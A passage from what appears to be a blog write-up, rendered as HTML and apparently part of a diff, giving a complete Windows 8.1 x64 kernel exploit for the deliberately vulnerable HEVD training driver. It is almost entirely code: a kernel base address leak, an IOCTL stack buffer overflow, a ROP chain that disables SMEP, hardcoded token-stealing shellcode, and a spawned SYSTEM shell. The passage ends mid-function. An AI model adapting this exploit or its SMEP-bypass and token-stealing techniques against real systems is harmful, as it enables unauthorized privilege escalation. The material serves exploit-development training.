+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>UINT64 <span style="color:#a6e22e">GetKernelBaseAddress</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ULONG_PTR  pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    LPVOID    <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD      dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// First call to EnumDeviceDrivers calculates the amount of space needed to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// store the results it will have.  It is up to the caller to allocate this
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// space, so this is a necessary step.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to retrieve size needed for device driver entries</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Using the results of the first call to EnumDeviceDrivers, allocate enough 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// space for EnumDeviceDrivers to store its results in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate space for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make the call to EnumDeviceDrivers, get a list of all loaded drivers in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers failed: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) 
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The kernel base is the first field of the results of EnumDeviceDrivers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Kernel Base Address calculated: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (UINT64)pKernelBaseAddress;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="final-exploit">Final exploit</h2>
+<p>Here is the final exploit, all commented up and ready for distribution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//////////////////////////////////////////////////////////////////// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                                                                //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//    Title:    HEVD x64 Stack Overflow                           //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//    Platform: Windows 8.1 Version 9600 MP (1 procs) Free x64    //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//    Author:   Jeremy Dunn (@stolenfootball)                     //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//    Website:  https://stolenfootball.github.io                  //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                                                                //
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">////////////////////////////////////////////////////////////////////
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  This program exploits a standard stack based buffer overflow in the 0x800 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  IOCTL of the HEVD (https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  driver.  The exploit is valid on Windows 8.1 x64 kernels.  For kernel versions 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  other than the one listed above, ROP gadget offsets may need to be changed.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  The driver takes in an arbitrary buffer from the user and performs an unchecked
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  memmove into a statically sized stack-based buffer in the kernel.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  The kernel stack buffer is 0x800 bytes long.  There are three callee saved 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  registers (r12, r14, and r15) that are overwritten for a total of 0x18 bytes.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  As such, bytes 0x818 through bytes 0x820 overflow the return address.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  The original values in the callee saved registers are:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      r12: set to 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      r14: holds a pointer to the current IO_STACK_LOCATION
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *      r15: holds a pointer to the FILE_OBJECT associated with the driver
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  All three registers are restored through the shellcode.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  This exploit uses the documented method of EnumDeviceDrivers to determine the 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  kernel base address.  It uses a ROP chain in ntkrnl.exe to disable SMEP.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable IOCTL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define HEVD_IOCTL_BUFFER_OVERFLOW \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    CTL_CODE( 0x22, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Sizes for overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define BUFFER_SIZE 2048
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define POINTER_SIZE 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// SMEP Constants
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define SMEP_BIT 20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_ORIG_VALUE 0x00000000001406f8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CR4_SMEP_DISABLED (CR4_ORIG_VALUE &amp; ~(1 &lt;&lt; SMEP_BIT))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ROP Gadgets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Windows 8.1 Kernel Version 9600 MP (1 procs) Free x64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define POP_RCX     0x000378df6      </span><span style="color:#75715e">// : pop rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define MOV_CR4_RCX 0x00008655a      </span><span style="color:#75715e">// : mov cr4, rcx ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Chain is 2 gadgets + 1 value to store in rcx + address of shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define CHAIN_SIZE 4 * POINTER_SIZE  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows8x64/shellcode.asm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>CHAR TokenStealingPayloadWin8[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2D</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xE0</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xF9</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xE6</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xBC</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x49</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xEE</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xF7</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x7F</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xC3</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
+</span></span><span style="display:flex;"><span>UINT64 <span style="color:#a6e22e">GetKernelBaseAddress</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hDevice;
+</span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(
+</span></span><span style="display:flex;"><span>        lpDeviceName,
+</span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
+</span></span><span style="display:flex;"><span>        FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to open handle to driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">TriggerExploit</span>(hDevice) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spawning shell with SYSTEM privliges...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hDevice);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    UINT64 <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    LPVOID  lpShellcode;
+</span></span><span style="display:flex;"><span>    UINT64  kernelBase;
+</span></span><span style="display:flex;"><span>    SIZE_T  inBufferSize;
+</span></span><span style="display:flex;"><span>    SIZE_T  returnAddrIndex;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
+</span></span><span style="display:flex;"><span>    SIZE_T  shellcodeSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(TokenStealingPayloadWin8);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate space for the shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Allocating executable memory for shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpShellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, shellcodeSize, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for shellcode: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy shellcode into executable user space memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlCopyMemory</span>(lpShellcode, TokenStealingPayloadWin8, shellcodeSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Shellcode copied into executable memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size for the overflow.  Need to overflow 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// the buffer, three callee saved registers, and enough space for the ROP chain.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> CHAIN_SIZE;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Alocate the user buffer to be sent to the driver
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, inBufferSize))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Created buffer of size: %zu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">RtlFillMemory</span>(lpInBuffer, inBufferSize, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Create the ROP Chain
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(kernelBase <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>())) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate kernel base</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Return address is at the buffer size plus the size of the three callee saved registers to 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// overwrite plus the size of the return address.  Since the array is of size UINT64, we need
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// to divide by 8 to get the correct index into the array from the raw size in bytes, then 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// subtract one to account for zero indexing.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    returnAddrIndex <span style="color:#f92672">=</span> ((BUFFER_SIZE <span style="color:#f92672">+</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> POINTER_SIZE) <span style="color:#f92672">+</span> POINTER_SIZE) <span style="color:#f92672">/</span> POINTER_SIZE) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> POP_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> CR4_SMEP_DISABLED;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> MOV_CR4_RCX <span style="color:#f92672">+</span> kernelBase;
+</span></span><span style="display:flex;"><span>    lpInBuffer[returnAddrIndex<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (UINT64)lpShellcode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">DeviceIoControl</span>(
+</span></span><span style="display:flex;"><span>        hDevice,
+</span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
+</span></span><span style="display:flex;"><span>        lpInBuffer,
+</span></span><span style="display:flex;"><span>        inBufferSize,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpInBuffer);
+</span></span><span style="display:flex;"><span>
